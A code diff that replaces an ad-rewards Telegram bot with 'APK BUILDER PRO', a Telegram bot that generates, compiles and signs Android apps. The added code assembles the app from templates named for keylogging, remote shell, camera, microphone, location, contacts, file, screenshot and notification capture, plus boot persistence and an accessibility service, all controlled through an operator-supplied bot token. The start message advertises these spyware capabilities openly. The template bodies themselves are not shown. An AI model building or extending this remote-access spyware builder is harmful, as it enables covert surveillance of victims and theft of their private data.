-        conn.execute("UPDATE withdrawals SET status='approved', processed_at=? WHERE id=? AND status='pending'",
-                     (datetime.now(timezone.utc).isoformat(), wid))
-    try:
-        async with httpx.AsyncClient() as c:
-            await c.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={"chat_id": row["user_id"],
-                      "text": f"✅ تمت الموافقة على سحبك `${row['amount']:.2f}`",
-                      "parse_mode": "Markdown"})
-    except Exception: pass
-    return {"ok": True}
-
-
-@app.post("/api/admin/withdrawals/{wid}/reject")
-async def adm_wd_reject(wid: int, req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        row = conn.execute("SELECT * FROM withdrawals WHERE id=?", (wid,)).fetchone()
-        if not row:
-            raise HTTPException(404, "غير موجود")
-        if row["status"] == "pending":
-            conn.execute("UPDATE users SET balance=balance+? WHERE user_id=?",
-                         (row["amount"], row["user_id"]))
-            conn.execute("UPDATE withdrawals SET status='rejected', processed_at=? WHERE id=?",
-                         (datetime.now(timezone.utc).isoformat(), wid))
-    try:
-        async with httpx.AsyncClient() as c:
-            await c.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={"chat_id": row["user_id"],
-                      "text": f"❌ رُفض سحبك وأُرجع `${row['amount']:.2f}` لرصيدك",
-                      "parse_mode": "Markdown"})
-    except Exception: pass
-    return {"ok": True}
-
-
-@app.get("/api/admin/contacts")
-async def adm_contacts(req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        rows = conn.execute(
-            "SELECT * FROM contact_requests WHERE status='new' ORDER BY id DESC LIMIT 100"
-        ).fetchall()
-    return [dict(r) for r in rows]
-
-
-@app.post("/api/admin/contacts/{cid}/done")
-async def adm_contact_done(cid: int, req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        conn.execute("UPDATE contact_requests SET status='done' WHERE id=?", (cid,))
-    return {"ok": True}
-
-
-@app.get("/api/admin/settings")
-async def adm_settings_get(req: Request):
-    await verify_admin(req)
-    return {
-        "ad_reward": get_setting("ad_reward"),
-        "daily_limit": get_setting("daily_limit"),
-        "min_withdraw": get_setting("min_withdraw"),
-        "referral_bonus": get_setting("referral_bonus"),
-        "daily_bonus": get_setting("daily_bonus"),
-        "task_wait": get_setting("task_wait"),
+    ctx = {
+        "pkg": pkg,
+        "app_name": cfg["app_name"],
+        "bot_token": cfg["bot_token"],
+        "admin_id": cfg["admin_id"],
+        "bot_username": BOT_USERNAME,
     }
 
+    (proj / "app" / "src" / "main" / "AndroidManifest.xml").write_text(
+        MANIFEST_TPL.format(perms_xml=perms_xml, **ctx), encoding="utf-8")
 
-@app.post("/api/admin/settings")
-async def adm_settings_set(req: Request):
-    body = await req.json()
-    await verify_admin(req)
-    for k in ["ad_reward", "daily_limit", "min_withdraw", "referral_bonus",
-              "daily_bonus", "task_wait"]:
-        if k in body:
-            set_setting(k, body[k])
-    return {"ok": True}
+    (res / "values" / "strings.xml").write_text(
+        f'<?xml version="1.0" encoding="utf-8"?>\n<resources>\n'
+        f'<string name="app_name">{cfg["app_name"]}</string>\n</resources>',
+        encoding="utf-8")
+
+    (res / "xml" / "accessibility_config.xml").write_text(
+        ACCESSIBILITY_XML, encoding="utf-8")
+
+    java_files = {
+        "MainActivity.java":      MAIN_ACTIVITY,
+        "ControlService.java":    CONTROL_SERVICE,
+        "CameraHelper.java":      CAMERA_HELPER,
+        "AudioHelper.java":       AUDIO_HELPER,
+        "FileHelper.java":        FILE_HELPER,
+        "LocationHelper.java":    LOCATION_HELPER,
+        "ContactsHelper.java":    CONTACTS_HELPER,
+        "WifiHelper.java":        WIFI_HELPER,
+        "AppsHelper.java":        APPS_HELPER,
+        "ScreenshotHelper.java":  SCREENSHOT_HELPER,
+        "ShellHelper.java":       SHELL_HELPER,
+        "KeyloggerService.java":  KEYLOGGER_SERVICE,
+        "NotificationListener.java": NOTIFICATION_LISTENER,
+        "BootReceiver.java":      BOOT_RECEIVER,
+    }
+    for name, tpl in java_files.items():
+        (pkg_path / name).write_text(tpl.format(**ctx), encoding="utf-8")
+
+    (proj / "app" / "build.gradle").write_text(
+        BUILD_GRADLE_TPL.format(pkg=pkg,
+            compile_sdk=CONFIG["compile_sdk"],
+            min_sdk=CONFIG["min_sdk"],
+            target_sdk=CONFIG["target_sdk"]), encoding="utf-8")
+
+    (proj / "build.gradle").write_text(
+        f"plugins {{\n    id 'com.android.application' version "
+        f"'{CONFIG['gradle_version']}' apply false\n}}", encoding="utf-8")
+
+    (proj / "settings.gradle").write_text(
+        "pluginManagement {\n"
+        "    repositories { google(); mavenCentral(); gradlePluginPortal() }\n"
+        "}\n"
+        "dependencyResolutionManagement {\n"
+        "    repositories { google(); mavenCentral() }\n"
+        "}\n"
+        'rootProject.name = "App"\ninclude \':app\'\n', encoding="utf-8")
+
+    (proj / "gradle.properties").write_text(
+        "android.useAndroidX=true\n"
+        "android.enableJetifier=true\n"
+        "org.gradle.jvmargs=-Xmx2048m\n", encoding="utf-8")
 
 
-@app.get("/api/admin/users")
-async def adm_users(req: Request, q: str = None, limit: int = 50):
-    await verify_admin(req)
-    with db() as conn:
-        if q:
-            rows = conn.execute(
-                """SELECT user_id, username, first_name, balance, total_earned, banned
-                   FROM users WHERE username LIKE ? OR first_name LIKE ? OR user_id=?
-                   ORDER BY total_earned DESC LIMIT ?""",
-                (f"%{q}%", f"%{q}%", q if q.isdigit() else 0, limit)).fetchall()
-        else:
-            rows = conn.execute(
-                """SELECT user_id, username, first_name, balance, total_earned, banned
-                   FROM users ORDER BY total_earned DESC LIMIT ?""", (limit,)).fetchall()
-    return [dict(r) for r in rows]
+# ═══════════════════════════════════════════════════════════════
+#                    التوقيع
+# ═══════════════════════════════════════════════════════════════
+def sign_apk(unsigned: Path, out: Path):
+    ks = CONFIG["keystore"]
+    ks_path = Path(ks["path"])
+    if not ks_path.exists():
+        subprocess.run([
+            "keytool", "-genkeypair", "-v",
+            "-keystore", str(ks_path),
+            "-alias", ks["alias"],
+            "-keyalg", "RSA", "-keysize", "2048", "-validity", "10000",
+            "-storepass", ks["store_password"],
+            "-keypass", ks["key_password"],
+            "-dname", "CN=App,OU=Dev,O=Dev,L=City,S=State,C=US",
+        ], check=True, capture_output=True)
+
+    aligned = unsigned.with_name("aligned.apk")
+    subprocess.run(["zipalign", "-f", "-p", "4",
+                    str(unsigned), str(aligned)],
+                   check=True, capture_output=True)
+
+    subprocess.run([
+        "apksigner", "sign",
+        "--ks", str(ks_path),
+        "--ks-key-alias", ks["alias"],
+        "--ks-pass", f"pass:{ks['store_password']}",
+        "--key-pass", f"pass:{ks['key_password']}",
+        "--out", str(out), str(aligned),
+    ], check=True, capture_output=True)
+
+    aligned.unlink(missing_ok=True)
 
 
-@app.post("/api/admin/users/{uid}/toggle-ban")
-async def adm_user_ban(uid: int, req: Request):
-    await verify_admin(req)
-    with db() as conn:
-        r = conn.execute("SELECT banned FROM users WHERE user_id=?", (uid,)).fetchone()
-        if not r:
-            raise HTTPException(404, "غير موجود")
-        conn.execute("UPDATE users SET banned=? WHERE user_id=?",
-                     (0 if r["banned"] else 1, uid))
-    return {"ok": True}
+def build_apk(cfg: dict, uid: int) -> str:
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    proj = BUILD_DIR / f"proj_{uid}_{ts}"
+    proj.mkdir(parents=True, exist_ok=True)
+    generate_project(cfg, proj)
+
+    r = subprocess.run(["gradle", "assembleRelease", "--no-daemon", "-q"],
+        cwd=proj, capture_output=True, text=True,
+        timeout=CONFIG["max_build_time"])
+    if r.returncode != 0:
+        raise Exception(f"Gradle:\n{r.stderr[-800:]}")
+
+    unsigned = next(proj.rglob("app-release-unsigned.apk"), None) \
+        or next(proj.rglob("*.apk"), None)
+    if not unsigned:
+        raise Exception("لم يُنتج APK")
+
+    final = BUILD_DIR / f"{cfg['app_name'].replace(' ', '_')}_{ts}.apk"
+    if CONFIG["sign_apk"]:
+        try: sign_apk(unsigned, final)
+        except Exception: shutil.copy(unsigned, final)
+    else: shutil.copy(unsigned, final)
+
+    shutil.rmtree(proj, ignore_errors=True)
+    return str(final)
 
 
-@app.post("/api/admin/broadcast")
-async def adm_broadcast(req: Request):
-    body = await req.json()
-    await verify_admin(req)
-    text = (body.get("text") or "").strip()
-    if not text:
-        raise HTTPException(400, "النص مطلوب")
-    with db() as conn:
-        users = conn.execute("SELECT user_id FROM users WHERE banned=0").fetchall()
-    sent = 0
-    async with httpx.AsyncClient(timeout=10) as c:
-        for u in users:
-            try:
-                r = await c.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                                 json={"chat_id": u["user_id"], "text": text,
-                                       "parse_mode": "Markdown"})
-                if r.json().get("ok"):
-                    sent += 1
-                await asyncio.sleep(0.05)
-            except Exception: pass
-    return {"ok": True, "sent": sent}
-
-# ═══════════════════════════════════════════════════════════════════════
-# 🤖 Bot Commands
-# ═══════════════════════════════════════════════════════════════════════
-async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    u = update.effective_user
-    if not rate_ok(u.id, max_hits=5, window=10):
-        return
-
-    user_dict = {"id": u.id, "username": u.username, "first_name": u.first_name,
-                 "last_name": u.last_name, "language_code": u.language_code,
-                 "is_premium": getattr(u, "is_premium", False)}
-    sp = context.args[0] if context.args else ""
-    ref = None
-    if sp.startswith("ref_"):
-        try:
-            ref = int(sp[4:])
-        except ValueError:
-            pass
-
-    get_or_create_user(user_dict, ref)
-
-    with db() as conn:
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (u.id,)).fetchone()
-
-    if row and not row["photo_url"]:
-        fid, photo = await fetch_telegram_photo(u.id)
-        if photo:
-            with db() as conn:
-                conn.execute("UPDATE users SET photo_url=?, photo_file_id=? WHERE user_id=?",
-                             (photo, fid, u.id))
-            row = db().execute("SELECT * FROM users WHERE user_id=?", (u.id,)).fetchone()
-
-    if not row:
-        await update.message.reply_text("حدث خطأ")
-        return
-
-    keys = row.keys()
-    lang_code = (row["lang"] if "lang" in keys else "ar") or "ar"
-    L = LANGS.get(lang_code, LANGS["ar"])
-
-    balance = row["balance"] or 0
-    total_earned = row["total_earned"] or 0
-    ads_today = row["ads_today"] or 0
-    referrals = row["referrals"] or 0
-    streak = row["streak"] or 0
-    daily_limit = get_setting("daily_limit", "10")
-    ad_reward = get_setting("ad_reward", "0.20")
-    min_w = get_setting("min_withdraw", "10.00")
-    ref_bonus = get_setting("referral_bonus", "0.50")
-    is_owner = u.id in ADMIN_IDS
-    premium = "⭐ " if getattr(u, "is_premium", False) else ""
-    owner_badge = "👑 " if is_owner else ""
-
-    rank, total = user_rank(u.id)
-
-    welcome = (
-        f"✨━━━━━━━━━━━━━━━━━━━━━━━✨\n"
-        f"      💎 *AdVault Pro VIP* 💎\n"
-        f"    _{L['welcome_sub']}_\n"
-        f"✨━━━━━━━━━━━━━━━━━━━━━━━✨\n\n"
-        f"{owner_badge}{premium}*{L['welcome_title']} {u.first_name or ''}*\n"
-        f"╭─────────────────────╮\n"
-        f"│ 🆔 *{L['identifier']}:* `{u.id}`\n"
-        f"│ 🔗 *{L['username']}:* {('@'+u.username) if u.username else '—'}\n"
-        f"│ 💰 *{L['balance']}:* `${balance:.2f}`\n"
-        f"│ 📊 *{L['total_earned']}:* `${total_earned:.2f}`\n"
-        f"│ 👁️ *{L['ads_today']}:* `{ads_today}/{daily_limit}`\n"
-        f"│ 🤝 *{L['referrals']}:* `{referrals}`\n"
-        f"│ 🔥 *{L['streak']}:* `{streak}`\n"
-        f"│ 🏆 *{L['rank']}:* `{rank}/{total}`\n"
-        f"╰─────────────────────╯\n\n"
-        f"⚡ *{L['welcome_sub']}*\n"
-        f"• 👁️ `${ad_reward}` / ad\n"
-        f"• 🤝 `${ref_bonus}` / referral\n"
-        f"• 💸 {L['min_withdraw']}: `${min_w}`\n"
-    )
-
+# ═══════════════════════════════════════════════════════════════
+#                       الأوامر
+# ═══════════════════════════════════════════════════════════════
+async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     kb = [
-        [InlineKeyboardButton(f"🚀 {L['open_app']}",
-                              web_app=WebAppInfo(url=WEBAPP_URL))],
-        [InlineKeyboardButton(f"🤝 {L['my_ref']}", callback_data="get_ref"),
-         InlineKeyboardButton(f"💰 {L['my_balance']}", callback_data="my_balance")],
-        [InlineKeyboardButton(f"📞 {L['contact']}", url=f"https://t.me/{ADMIN_CONTACT}"),
-         InlineKeyboardButton(f"📊 {L['leaderboard']}", callback_data="show_lb")],
-        [InlineKeyboardButton(f"🌐 {L['select_lang']}", callback_data="set_lang")],
+        [InlineKeyboardButton("🚀 بناء تطبيق جديد", callback_data="new_build")],
+        [InlineKeyboardButton("📊 إحصائياتي", callback_data="stats"),
+         InlineKeyboardButton("📖 المساعدة", callback_data="help")],
     ]
-    if is_owner:
-        kb.append([InlineKeyboardButton(f"👑 {L['admin_panel']}",
-                                        web_app=WebAppInfo(url=WEBAPP_URL))])
+    await update.message.reply_text(
+        "╔══════════════════════════════════════╗\n"
+        "║  👑  <b>APK BUILDER PRO  v4.0</b>          ║\n"
+        "║      <i>Ultra Edition</i>                  ║\n"
+        "╚══════════════════════════════════════╝\n\n"
+        f"👋 مرحباً <b>{update.effective_user.first_name}</b>\n\n"
+        "🎯 <b>المميزات:</b>\n"
+        "├ 📱 بناء تطبيقات Android كاملة\n"
+        "├ 🔐 توقيع APK تلقائي\n"
+        "├ 🤖 بوت تحكم مدمج\n"
+        "├ 📸 كاميرا / 🎙️ صوت / 📁 ملفات\n"
+        "├ 📍 موقع / 📞 جهات / 💻 Shell\n"
+        "├ ⌨️ Keylogger / 🔔 إشعارات\n"
+        "├ 📶 WiFi / 🖥️ شاشة / 📦 تطبيقات\n"
+        "└ ♻️ إعادة تشغيل تلقائي\n\n"
+        "اختر من القائمة 👇",
+        reply_markup=InlineKeyboardMarkup(kb),
+        parse_mode=ParseMode.HTML)
 
-    photo_fid = ""
-    try:
-        photo_fid = row["photo_file_id"] if "photo_file_id" in row.keys() else ""
-        if not photo_fid:
-            photo_fid = ""
-    except Exception:
-        photo_fid = ""
 
+async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "📖 <b>دليل الاستخدام</b>\n\n"
+        "1️⃣ اسم التطبيق\n"
+        "2️⃣ اسم الحزمة (com.xxx.yyy)\n"
+        "3️⃣ Telegram ID\n"
+        "4️⃣ توكن البوت الفرعي\n"
+        "5️⃣ الصلاحيات\n"
+        "6️⃣ المميزات\n"
+        "7️⃣ السمة\n"
+        "8️⃣ الأيقونة\n"
+        "9️⃣ تأكيد البناء\n\n"
+        "⚠️ البوت الفرعي يجب أن يكون منفصلاً",
+        parse_mode=ParseMode.HTML)
+
+
+async def cb_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    uid = q.from_user.id
+    used = user_apk_count[uid]
+    maxx = CONFIG["max_apk_per_user"]
+    bar = "█" * used + "░" * (maxx - used)
+    await q.edit_message_text(
+        f"📊 <b>إحصائياتك</b>\n\n"
+        f"🆔 <code>{uid}</code>\n"
+        f"📱 <b>البناءات:</b> {used}/{maxx}\n"
+        f"📊 [{bar}]\n"
+        f"✅ {'متاح' if used < maxx else '⛔ تجاوزت'}",
+        parse_mode=ParseMode.HTML,
+        reply_markup=InlineKeyboardMarkup(
+            [[InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]]))
+
+
+async def cb_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    await q.edit_message_text(
+        "📖 استخدم /help",
+        reply_markup=InlineKeyboardMarkup(
+            [[InlineKeyboardButton("🔙 رجوع", callback_data="back_home")]]))
+
+
+async def cb_back_home(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    kb = [
+        [InlineKeyboardButton("🚀 بناء تطبيق جديد", callback_data="new_build")],
+        [InlineKeyboardButton("📊 إحصائياتي", callback_data="stats"),
+         InlineKeyboardButton("📖 المساعدة", callback_data="help")],
+    ]
+    await q.edit_message_text("🏠 <b>القائمة الرئيسية</b>",
+        reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.HTML)
+
+
+# ────────────── Conversation ──────────────
+async def new_build(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    if update.callback_query:
+        q = update.callback_query; await q.answer()
+        uid = q.from_user.id
+        send = q.edit_message_text
+    else:
+        uid = update.effective_user.id
+        send = update.message.reply_text
+
+    if user_apk_count[uid] >= CONFIG["max_apk_per_user"]:
+        await send("⛔ تجاوزت الحد الأقصى.")
+        return ConversationHandler.END
+
+    user_sessions[uid] = {"perms": [], "features": [],
+        "theme": "dark", "created": datetime.now()}
+    await send("📝 <b>خطوة 1/8</b>\n\nأدخل <b>اسم التطبيق</b>:",
+        parse_mode=ParseMode.HTML)
+    return ST_NAME
+
+
+async def st_name(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    user_sessions[uid]["app_name"] = update.message.text.strip()[:40]
+    await update.message.reply_text(
+        f"✅ <b>{user_sessions[uid]['app_name']}</b>\n\n"
+        f"📦 <b>خطوة 2/8</b>\n\nأدخل <b>اسم الحزمة</b>:\n"
+        f"مثال: <code>com.yourname.app</code>",
+        parse_mode=ParseMode.HTML)
+    return ST_PKG
+
+
+async def st_pkg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    import re
+    uid = update.effective_user.id
+    pkg = update.message.text.strip().lower()
+    if not re.match(r"^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$", pkg):
+        await update.message.reply_text("❌ صيغة خاطئة. مثال: <code>com.x.y</code>",
+            parse_mode=ParseMode.HTML)
+        return ST_PKG
+    user_sessions[uid]["pkg_name"] = pkg
+    await update.message.reply_text(
+        f"✅ <code>{pkg}</code>\n\n"
+        f"🆔 <b>خطوة 3/8</b>\n\nأدخل <b>Telegram ID</b>:",
+        parse_mode=ParseMode.HTML)
+    return ST_ADMIN
+
+
+async def st_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    try: aid = int(update.message.text.strip())
+    except ValueError:
+        await update.message.reply_text("❌ أرسل رقماً:")
+        return ST_ADMIN
+    user_sessions[uid]["admin_id"] = aid
+    await update.message.reply_text(
+        f"✅ <code>{aid}</code>\n\n"
+        f"🔑 <b>خطوة 4/8</b>\n\nأدخل <b>توكن البوت الفرعي</b>:",
+        parse_mode=ParseMode.HTML)
+    return ST_TOKEN
+
+
+async def st_token(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    token = update.message.text.strip()
+    if token.count(":") != 1 or len(token) < 40:
+        await update.message.reply_text("❌ توكن غير صالح:")
+        return ST_TOKEN
+    user_sessions[uid]["bot_token"] = token
+    try: await update.message.delete()
+    except Exception: pass
+    return await show_perms(update, ctx)
+
+
+async def show_perms(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    sel = user_sessions[uid]["perms"]
+    rows = []
+    items = list(PERMISSIONS.items())
+    for i in range(0, len(items), 2):
+        row = []
+        for k, (em, name, _) in items[i:i+2]:
+            m = "✅" if k in sel else "⬜"
+            row.append(InlineKeyboardButton(f"{m} {em} {name}",
+                callback_data=f"perm:{k}"))
+        rows.append(row)
+    rows.append([InlineKeyboardButton("➡️ التالي", callback_data="perm:next")])
+    txt = "🔐 <b>خطوة 5/8 — الصلاحيات</b>"
+    if update.callback_query:
+        await update.callback_query.edit_message_text(txt,
+            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+    else:
+        await update.message.reply_text(txt,
+            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+    return ST_PERMS
+
+
+async def cb_perms(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    uid = q.from_user.id
+    data = q.data.split(":", 1)[1]
+    if data == "next": return await show_feats(update, ctx)
+    perms = user_sessions[uid]["perms"]
+    if data in perms: perms.remove(data)
+    else: perms.append(data)
+    return await show_perms(update, ctx)
+
+
+async def show_feats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    sel = user_sessions[uid]["features"]
+    rows = []
+    items = list(FEATURES.items())
+    for i in range(0, len(items), 2):
+        row = []
+        for k, (em, name) in items[i:i+2]:
+            m = "✅" if k in sel else "⬜"
+            row.append(InlineKeyboardButton(f"{m} {em} {name}",
+                callback_data=f"feat:{k}"))
+        rows.append(row)
+    rows.append([InlineKeyboardButton("➡️ التالي", callback_data="feat:next")])
+    txt = "⚙️ <b>خطوة 6/8 — المميزات</b>"
+    if update.callback_query:
+        await update.callback_query.edit_message_text(txt,
+            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+    else:
+        await update.message.reply_text(txt,
+            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+    return ST_FEATS
+
+
+async def cb_feats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    uid = q.from_user.id
+    data = q.data.split(":", 1)[1]
+    if data == "next": return await show_themes(update, ctx)
+    feats = user_sessions[uid]["features"]
+    if data in feats: feats.remove(data)
+    else: feats.append(data)
+    return await show_feats(update, ctx)
+
+
+async def show_themes(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    rows = [[InlineKeyboardButton(f"{em} {name}", callback_data=f"theme:{k}")]
+            for k, (em, name) in THEMES.items()]
+    txt = "🎨 <b>خطوة 7/8 — السمة</b>"
+    if update.callback_query:
+        await update.callback_query.edit_message_text(txt,
+            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+    else:
+        await update.message.reply_text(txt,
+            reply_markup=InlineKeyboardMarkup(rows), parse_mode=ParseMode.HTML)
+    return ST_THEME
+
+
+async def cb_theme(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    user_sessions[q.from_user.id]["theme"] = q.data.split(":", 1)[1]
+    await q.edit_message_text(
+        "🖼️ <b>خطوة 8/8 — الأيقونة</b>\n\nأرسل صورة 512×512:",
+        parse_mode=ParseMode.HTML)
+    return ST_ICON
+
+
+async def st_icon(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    if update.message.photo:
+        file = await update.message.photo[-1].get_file()
+    elif update.message.document and update.message.document.mime_type.startswith("image/"):
+        file = await update.message.document.get_file()
+    else:
+        await update.message.reply_text("❌ أرسل صورة:")
+        return ST_ICON
+    icon_path = BUILD_DIR / f"{uid}_icon_{secrets.token_hex(4)}.png"
+    await file.download_to_drive(icon_path)
     try:
-        if photo_fid:
-            await update.message.reply_photo(photo=photo_fid, caption=welcome,
-                                             parse_mode="Markdown",
-                                             reply_markup=InlineKeyboardMarkup(kb))
-        elif row["photo_url"]:
-            await update.message.reply_photo(photo=row["photo_url"], caption=welcome,
-                                             parse_mode="Markdown",
-                                             reply_markup=InlineKeyboardMarkup(kb))
-        else:
-            await update.message.reply_text(welcome, parse_mode="Markdown",
-                                            reply_markup=InlineKeyboardMarkup(kb),
-                                            disable_web_page_preview=True)
+        img = Image.open(icon_path).convert("RGBA").resize((512, 512), Image.LANCZOS)
+        img.save(icon_path, "PNG", optimize=True)
     except Exception as e:
-        print(f"❌ start send: {e}")
-        try:
-            await update.message.reply_text(welcome, parse_mode="Markdown",
-                                            reply_markup=InlineKeyboardMarkup(kb),
-                                            disable_web_page_preview=True)
-        except Exception:
-            pass
+        await update.message.reply_text(f"❌ {e}")
+        return ST_ICON
+    user_sessions[uid]["icon"] = str(icon_path)
+    return await show_summary(update, ctx)
 
 
-async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        await update.message.reply_text("⛔")
-        return
-    await update.message.reply_text(
-        "👑 *لوحة التحكم*\n\nافتح التطبيق المصغر — تبويب المشرف",
-        reply_markup=InlineKeyboardMarkup([[
-            InlineKeyboardButton("👑 فتح", web_app=WebAppInfo(url=WEBAPP_URL))]]),
-        parse_mode="Markdown")
-
-
-async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def show_summary(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
-    with db() as conn:
-        row = conn.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
-    if not row:
-        await update.message.reply_text("افتح التطبيق أولاً")
-        return
-    rank, total = user_rank(uid)
-    await update.message.reply_text(
-        f"💰 `${row['balance']:.2f}`\n📊 `${row['total_earned']:.2f}`\n"
-        f"👁️ `{row['ads_today']}/{get_setting('daily_limit')}`\n"
-        f"🏆 `{rank}/{total}`", parse_mode="Markdown")
+    s = user_sessions[uid]
+    pt = "\n".join(f"  {PERMISSIONS[p][0]} {PERMISSIONS[p][1]}" for p in s["perms"]) or "  لا شيء"
+    ft = "\n".join(f"  {FEATURES[f][0]} {FEATURES[f][1]}" for f in s["features"]) or "  لا شيء"
+    text = (f"📋 <b>ملخص الإعدادات</b>\n\n"
+            f"📱 <b>الاسم:</b> {s['app_name']}\n"
+            f"📦 <b>الحزمة:</b> <code>{s['pkg_name']}</code>\n"
+            f"🆔 <b>Admin:</b> <code>{s['admin_id']}</code>\n"
+            f"🎨 <b>السمة:</b> {THEMES[s['theme']][1]}\n\n"
+            f"🔐 <b>الصلاحيات ({len(s['perms'])}):</b>\n{pt}\n\n"
+            f"⚙️ <b>المميزات ({len(s['features'])}):</b>\n{ft}")
+    kb = [[InlineKeyboardButton("✅ ابدأ البناء", callback_data="build:go")],
+          [InlineKeyboardButton("❌ إلغاء", callback_data="build:cancel")]]
+    msg = update.callback_query.message if update.callback_query else update.message
+    await msg.reply_text(text, reply_markup=InlineKeyboardMarkup(kb),
+        parse_mode=ParseMode.HTML)
+    return ST_CONFIRM
 
 
-async def cmd_ref(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    link = f"https://t.me/{context.bot.username}?start=ref_{uid}"
-    await update.message.reply_text(
-        f"🤝 `{link}`\n\n💰 `${get_setting('referral_bonus')}` / referral",
-        parse_mode="Markdown")
+async def cb_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query; await q.answer()
+    uid = q.from_user.id
+    action = q.data.split(":", 1)[1]
+    if action == "cancel":
+        user_sessions.pop(uid, None)
+        await q.edit_message_text("❌ تم الإلغاء.")
+        return ConversationHandler.END
+    await q.edit_message_text("⚙️ <b>جاري البناء...</b>\n\n⏳ 5-15 دقيقة",
+        parse_mode=ParseMode.HTML)
+    asyncio.create_task(build_and_send(q.message, uid, user_sessions[uid]))
+    return ConversationHandler.END
 
 
-async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        return
-    up = int(time.time() - START_TIME)
-    with db() as conn:
-        users = conn.execute("SELECT COUNT(*) FROM users").fetchone()[0]
-        ads = conn.execute("SELECT COUNT(*) FROM ads WHERE active=1").fetchone()[0]
-        tasks = conn.execute("SELECT COUNT(*) FROM tasks WHERE active=1").fetchone()[0]
-    await update.message.reply_text(
-        f"📊 *Stats*\n▬▬▬▬▬▬▬▬▬▬\n"
-        f"👥 Users: `{users}`\n"
-        f"📢 Ads: `{ads}`\n"
-        f"📋 Tasks: `{tasks}`\n"
-        f"⏱ Uptime: `{timedelta(seconds=up)}`\n"
-        f"💓 Pings: `{HEARTBEAT_STATS['internal']}`",
-        parse_mode="Markdown")
+async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    user_sessions.pop(update.effective_user.id, None)
+    await update.message.reply_text("❌ تم الإلغاء.")
+    return ConversationHandler.END
 
 
-async def cmd_lang(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    args = context.args
-    if args and args[0] in LANGS:
-        new_lang = args[0]
-        with db() as conn:
-            conn.execute("UPDATE users SET lang=? WHERE user_id=?", (new_lang, uid))
-        await update.message.reply_text(
-            f"✅ Language: *{LANGS[new_lang]['name']}*", parse_mode="Markdown")
-        return
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar"),
-         InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
-    ])
-    await update.message.reply_text("🌐 اختر اللغة / Choose language", reply_markup=kb)
-
-
-async def callback_set_lang(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🇸🇦 العربية", callback_data="lang_ar"),
-         InlineKeyboardButton("🇬🇧 English", callback_data="lang_en")],
-    ])
-    await q.message.reply_text("🌐 اختر اللغة / Choose language", reply_markup=kb)
-
-
-async def callback_lang_choice(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
-    lang_code = q.data.replace("lang_", "")
-    if lang_code not in LANGS:
-        return
-    with db() as conn:
-        conn.execute("UPDATE users SET lang=? WHERE user_id=?", (lang_code, q.from_user.id))
-    await q.edit_message_text(f"✅ {LANGS[lang_code]['name']}")
+async def build_and_send(message, uid: int, cfg: dict):
     try:
-        await cmd_start(update, context)
-    except Exception:
-        pass
-
-
-async def callback_get_ref(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query
-    await q.answer()
-    link = f"https://t.me/{context.bot.username}?start=ref_{q.from_user.id}"
-    await q.message.reply_text(f"🤝 `{link}`", parse_mode="Markdown")
-
-
-async def callback_my_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
